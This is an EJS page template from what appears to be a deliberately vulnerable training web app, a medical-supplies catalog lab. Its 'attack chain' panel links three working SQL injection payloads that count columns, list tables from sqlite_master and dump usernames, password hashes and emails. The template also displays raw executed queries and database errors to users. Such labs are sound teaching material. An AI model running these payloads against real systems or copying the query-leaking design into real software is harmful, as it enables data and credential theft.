<%- include('partials/header') %>

<div class="page-header">
    <h2>Medical Equipment & Pharmaceuticals Catalog</h2>
    <p>Filter inventory by therapeutic category or test SQL injection payloads below.</p>
</div>

<!-- Category Filter Form -->
<div class="filter-bar">
    <form action="/products" method="GET" class="category-form">
        <label for="category">Category Filter:</label>
        <select name="category" id="category" onchange="this.form.submit()">
            <option value="">-- All Categories --</option>
            <option value="Equipment" <%= category === 'Equipment' ? 'selected' : '' %>>Equipment</option>
            <option value="Supplements" <%= category === 'Supplements' ? 'selected' : '' %>>Supplements</option>
            <option value="Emergency" <%= category === 'Emergency' ? 'selected' : '' %>>Emergency</option>
            <option value="Protection" <%= category === 'Protection' ? 'selected' : '' %>>Protection</option>
        </select>
        <noscript><button type="submit" class="btn btn-sm btn-primary">Filter</button></noscript>
    </form>

    <div class="filter-actions">
        <a href="/products" class="btn btn-sm btn-outline">Clear Filter</a>
    </div>
</div>

<!-- SQL Injection Diagnostic Box (Visible in Vulnerable Mode for Enumeration) -->
<% if (typeof rawQuery !== 'undefined' && rawQuery) { %>
    <div class="diagnostic-box">
        <span class="diagnostic-title">[SERVER EXECUTED QUERY]:</span>
        <code><%= rawQuery %></code>
    </div>
<% } %>

<% if (typeof sqlError !== 'undefined' && sqlError) { %>
    <div class="alert alert-danger">
        <strong>[DATABASE ERROR]:</strong>
        <code><%= sqlError %></code>
    </div>
<% } %>

<!-- Advanced SQLi Walkthrough Panel -->
<div class="attack-helper-panel">
    <h4>[ATTACK CHAIN] Level 3 Advanced SQL Injection:</h4>
    <ol class="attack-steps">
        <li>
            <strong>Step 1 (Column Enumeration):</strong> Check column count using <code>ORDER BY</code>:
            <br>
            <a href="/products?category=Equipment'%20ORDER%20BY%205%20--" class="code-link">Equipment' ORDER BY 5 --</a> (Passes) vs 
            <a href="/products?category=Equipment'%20ORDER%20BY%206%20--" class="code-link">Equipment' ORDER BY 6 --</a> (Throws error, proving 5 columns)
        </li>
        <li>
            <strong>Step 2 (Table Enumeration):</strong> Extract tables from <code>sqlite_master</code>:
            <br>
            <a href="/products?category=Equipment'%20UNION%20SELECT%201,%20tbl_name,%20sql,%204,%205%20FROM%20sqlite_master%20WHERE%20type='table'%20--" class="code-link">
                Equipment' UNION SELECT 1, tbl_name, sql, 4, 5 FROM sqlite_master WHERE type='table' --
            </a>
        </li>
        <li>
            <strong>Step 3 (Sensitive Data Extraction):</strong> Extract usernames, password hashes, emails, balances:
            <br>
            <a href="/products?category=Equipment'%20UNION%20SELECT%201,%20username,%20password%20||%20'%20|%20'%20||%20email,%20balance,%20role%20FROM%20users%20--" class="code-link">
                Equipment' UNION SELECT 1, username, password || ' | ' || email, balance, role FROM users --
            </a>
        </li>
    </ol>
</div>

<!-- Products Table / Catalog Grid -->
<div class="product-grid">
    <% if (products && products.length > 0) { %>
        <% products.forEach(function(product) { %>
            <div class="product-card">
                <div class="product-info">
                    <span class="product-category"><%= product.category %></span>
                    <h3 class="product-title"><%= product.name %></h3>
                    <p class="product-desc"><%= product.description %></p>
                    <div class="product-footer">
                        <span class="product-price">$<%= product.price %></span>
                        <a href="/products/<%= product.id %>" class="btn btn-sm btn-primary">View & Review</a>
                    </div>
                </div>
            </div>
        <% }); %>
    <% } else { %>
        <div class="empty-state">
            <p>No products returned for this query or category.</p>
        </div>
    <% } %>
</div>

<%- include('partials/footer') %>
